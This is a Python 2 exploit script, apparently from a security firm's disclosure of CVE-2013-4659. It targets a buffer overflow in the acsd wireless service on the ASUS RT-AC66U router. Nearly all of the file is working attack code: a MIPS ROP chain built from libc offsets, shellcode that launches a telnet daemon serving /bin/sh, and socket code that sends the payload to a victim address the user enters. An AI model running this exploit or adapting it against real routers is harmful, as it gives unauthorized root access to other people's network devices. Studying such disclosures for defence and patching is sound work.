#!/usr/bin/env python

import signal, struct
from time import sleep
from socket import *
from sys import exit, exc_info

#
# Title*******************ASUS RT-AC66U Remote Root Shell Exploit - acsd param command
# Discovered and Reported*June 2013 
# Discovered/Exploited By*Jacob Holcomb/Gimppy and Jacob Thompson
#                        *Security Analsyts @ Independent Security Evaluators
# Software Vendor*********http://asus.com
# Exploit/Advisory********http://securityevaluators.com, http://infosec42.blogspot.com/
# Software****************acsd wireless service (Listens on TCP/5916)
# Firmware Version********3.0.0.4.266 (Other versions were not tested and may be vulnerable) 
# CVE*********************ASUS RT-AC66U Multiple Buffer Overflows: CVE-2013-4659
#
# Overview:
#	The ASUS RT-AC66U contains the Broadcom ACSD Wireless binary that is vulnerable to multiple 
#   Buffer Overflow attacks.
#
#   Multiple overflows exist in the following software:
#
#	- Broadcom acsd - Wireless Channel Service (autochannel&param, autochannel&data, csscan&ifname commands)
#														


def sigHandle(signum, frm): # Signal handler
    
    print "\n[!!!] Cleaning up the exploit... [!!!]\n"
    sleep(1)
    exit(0)


def targServer():
    
    while True:    
        try:
            server = inet_aton(raw_input("\n[*] Please enter the IPv4 address of the ASUS RT-AC66U router:\n\n>"))
            server = inet_ntoa(server)
            break
        except:
            print "\n\n[!!!] Error: Please enter a valid IPv4 address. [!!!]\n\n"
            sleep(1)
            continue
            
    return server   


def main():
      
    print ("""\n [*] Title: ASUS RT-AC66U Remote Root Shell Exploit - acsd param command
 [*] Discovered and Reported: June 2013
 [*] Discovered/Exploited By: Jacob Holcomb/Gimppy and Jacob Thompson, Security Analysts @ ISE
 [*] Software Vendor: http://asus.com
 [*] Exploit/Advisory: http://securityevaluators.com, http://infosec42.blogspot.com/
 [*] Software: acsd wireless service (Listens on TCP/5916)
 [*] Firmware Version: 3.0.0.4.266 (Other versions were not tested and may be vulnerable)
 [*] CVE: ASUS RT-AC66U Broadcom ACSD Buffer Overflow: CVE-2013-4659\n""")
    signal.signal(signal.SIGINT, sigHandle) #Setting signal handler for ctrl + c
    victim = targServer()
    port = int(5916)
    acsdCmd = "autochannel&param=" #Vulnerable command - JH
    
    # base address of .text section of libc.so.0 in acsd's address space
    libc_base = 0x2ab25000

    # ROP gadget #1
    # lui     s0,0x2
    # li      a0,1
    # move    t9,s1
    # jalr    t9
    # ori     a1,s0,0x2
    ra1 = struct.pack("<L", libc_base + 0x2d39c)

    # ROP gadget #2
    # move    t9,s3
    # lw      ra,44(sp)
    # lw      s4,40(sp)
    # lw      s3,36(sp)
    # lw      s2,32(sp)
    # lw      s1,28(sp)
    # lw      s0,24(sp)
    # jr      t9
    s1 = struct.pack("<L", libc_base + 0x34358)

    # sleep() - used to force program context switch (cache flush)
    s3 = struct.pack("<L", libc_base + 0x2cb90)

    # ROP gadget #3
    # addiu   a1,sp,24
    # lw      gp,16(sp)
    # lw      ra,32(sp)
    # jr      ra
    # addiu   sp,sp,40
    ra2 = struct.pack("<L", libc_base + 0xa1b0)

    # ROP gadget #4
    # move    t9,a1
    # addiu   a0,a0,56
    # jr      t9
    # move    a1,a2
    ra3 = struct.pack("<L", libc_base + 0x3167c)

    # jalr sp
    jalr_sp =  "\x09\xf8\xa0\x03"
    
    JuNk = "\x42" * 510
    safeNop = "2Aa3"

    #80 Bytes system() Shellcode by Jacob Holcomb of ISE
    #Calling system() and executing telnetd -l /bin/sh
    shellcode = "\x6c\x6e\x08\x3c\x74\x65\x08\x35\xec\xff\xa8"
    shellcode += "\xaf\x64\x20\x09\x3c\x65\x74\x29\x35\xf0\xff"
    shellcode += "\xa9\xaf\x20\x2f\x0a\x3c\x2d\x6c\x4a\x35\xf4"
    shellcode += "\xff\xaa\xaf\x6e\x2f\x0b\x3c\x62\x69\x6b\x35"
    shellcode += "\xf8\xff\xab\xaf\x73\x68\x0c\x24\xfc\xff\xac"
    shellcode += "\xaf\xec\xff\xa4\x23\xec\xff\xbd\x23\xb4\x2a"
    shellcode += "\x19\x3c\x50\xf0\x39\x37\x09\xf8\x20\x03\x32"
    shellcode += "\x41\x61\x33"

    sploit = acsdCmd + JuNk + s1 + JuNk[0:4] + s3 + ra1 + JuNk[0:48]
    sploit += ra2 + JuNk[0:24]+ jalr_sp + safeNop + ra3 + JuNk[0:4]
    sploit += safeNop + shellcode

    try:
        print "\n [*] Creating network socket."
        net_sock = socket(AF_INET, SOCK_STREAM)
    except:
        print "\n [!!!] There was an error creating the network socket. [!!!]\n\n%s\n" % exc_info()       
        sleep(1)
        exit(0)    

    try:
        print " [*] Connecting to ASUS RT-AC66U router @ %s on port TCP/%d." % (victim, port)
        net_sock.connect((victim, port))
    except:
        print "\n [!!!] There was an error connecting to %s. [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)
 
    try:
        print """ [*] Attempting to exploit the acsd param command.
 [*] Sending 1337 ro0t Sh3ll exploit to %s on TCP port %d.
 [*] Payload Length: %d bytes.""" % (victim, port, len(sploit))
        net_sock.send(sploit)
        sleep(1)
    except:
        print "\n [!!!] There was an error sending the 1337 ro0t Sh3ll exploit to %s [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)

    try:
        print """ [*] 1337 ro0t Sh3ll exploit was sent! Fingers crossed for code execution!
 [*] Closing network socket. Press ctrl + c repeatedly to force exploit cleanup.\n"""
        net_sock.close()
    except:
        print "\n [!!!] There was an error closing the network socket. [!!!]\n\n%s\n" % exc_info()
        sleep(1)
        exit(0)


if __name__ == "__main__":
    main()